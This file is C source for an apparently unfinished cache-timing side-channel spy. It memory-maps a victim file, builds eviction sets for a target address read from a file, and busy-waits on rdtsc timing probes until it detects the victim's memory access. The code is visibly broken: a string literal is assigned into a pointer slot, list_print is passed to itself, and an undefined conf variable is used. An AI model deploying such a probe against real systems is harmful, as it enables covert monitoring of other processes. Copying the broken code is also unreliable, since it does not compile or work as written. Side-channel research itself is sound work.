#include "evset-timings.c"
#include <sys/stat.h>
// #include <sys/types.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <x86intrin.h>

static Node **spy_evsets = NULL;
static void *victim;
static int map_len;

// load probe adresses from file
void *target_loader(char *file_path)
{
    FILE *fp = fopen(file_path, "r");
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    if (fp == NULL)
    {
        perror("Error reading adress file (fopen)!\n");
        exit(EXIT_FAILURE);
    }
    
    // init linked list
    void *spy_target;
    // https://linux.die.net/man/3/getline
    // read line for line and parse linewise read string to pointers
    while ((read = getline(&line, &len, fp)) != -1) {
        
        (&line)[strlen(line)-1] = "\0"; //delete "\n"
        spy_target = (char *)strtol(line, NULL, 16); // make read string to pointer
               
    }

    fclose(fp);
    free(line);

    // returns last target adrs (expands later)
    return spy_target;
}

void victim_reader(char *filepath){
    FILE *fp = fopen(filepath, "r");
    int fd = fileno(fp);
    struct stat st_buf;
    fstat(fd, &st_buf);
    map_len = st_buf.st_size;
    victim = mmap(NULL, map_len, PROT_READ, MAP_SHARED, fd, 0);
    if (victim == MAP_FAILED) {
        perror("mmap victim failed!");
        exit(EXIT_FAILURE);
    }
}

void init_spy(char *victim_filepath, void *spy_target){

    // load victim 
    victim_reader(victim_filepath);

    // prepare evset
    Config *spy_conf= config_init(24, 2048, 64, 105, 2097152, 1, 1);
    init_evset(spy_conf);
    spy_evsets = find_evset(spy_conf, spy_target);
    
    printf("[+] spy evset for target adrs %p\n", spy_target);
    list_print(list_print);
}

uint64_t my_detect(void *spy_target){
    my_access(spy_target);       
    traverse_list0(*list_print);
    my_access(spy_target+222);

    // measure access time for one entry
    return probe_chase_loop(spy_target, 1);       
}

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

void my_monitor(void *spy_target){
    uint64_t detected=0;
    unsigned long long old_tsc, tsc = rdtsc();
    while(1)
    {
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        detected= my_detect(spy_target);
        if(detected > conf->threshold) break;
    }
    printf("[!] victim acitivity detected!\n");
}

void spy(char *victim_filepath, void *spy_target){
    init_spy(victim_filepath, spy_target);
    my_monitor(spy_target);
}

int main(int ac, char **av){    
    spy(av[1], target_loader(av[2]));
}